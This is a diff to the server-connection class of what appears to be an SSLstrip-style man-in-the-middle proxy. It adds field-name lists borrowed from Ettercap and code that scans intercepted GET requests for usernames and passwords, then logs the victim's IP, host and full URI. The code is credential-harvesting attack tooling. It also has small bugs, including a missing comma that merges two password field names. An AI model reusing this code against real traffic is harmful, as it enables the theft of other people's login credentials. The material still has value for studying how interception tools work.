@@ -36,6 +36,7 @@ class ServerConnection(HTTPClient):
     urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
 
     def __init__(self, command, uri, postData, headers, client):
+
         self.command          = command
         self.uri              = uri
         self.postData         = postData
@@ -49,6 +50,17 @@ class ServerConnection(HTTPClient):
         self.contentLength    = None
         self.shutdownComplete = False
 
+        #these field names were stolen from the etter.fields file (Ettercap Project)
+        self.http_userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
+                                'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
+                                'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
+                                'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
+                                'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in']
+
+        self.http_passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
+                                'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
+                                'passwort', 'passwrd', 'wppassword', 'upasswd']
+
     def getPostPrefix(self):
         return "POST"
 
@@ -59,6 +71,17 @@ class ServerConnection(HTTPClient):
                 self.urlMonitor.writeClientLog(self.client, self.headers, message)
             else:
                 logging.info(message)
+
+            #check for creds passed in GET requests.. It's surprising to see how many people still do this (please stahp)
+            for user in self.http_userfields:
+                username = re.findall("("+ user +")=([^&|;]*)", self.uri, re.IGNORECASE)
+
+            for passw in self.http_passfields:
+                password = re.findall("(" + passw + ")=([^&|;]*)", self.uri, re.IGNORECASE)
+
+            if (username and password):
+                message = "%s %s Possible Credentials (%s):\n%s" % (self.client.getClientIP(), self.command, self.headers['host'], self.uri)
+                logging.warning(message)
 
         self.plugins.hook()
         self.sendCommand(self.command, self.uri)
